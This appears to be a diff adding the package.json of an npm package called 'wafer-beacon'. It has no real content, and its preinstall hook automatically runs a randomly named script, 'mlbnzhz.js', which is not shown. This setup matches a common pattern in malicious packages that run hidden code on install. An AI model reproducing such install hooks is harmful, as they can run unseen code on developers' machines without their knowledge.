@@ -1,0 +1,11 @@
+{
+  "name": "wafer-beacon",
+  "version": "1.3.3",
+  "main": "mlbnzhz.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node mlbnzhz.js"
+  },
+  "author": "",
+  "license": "ISC"
+}
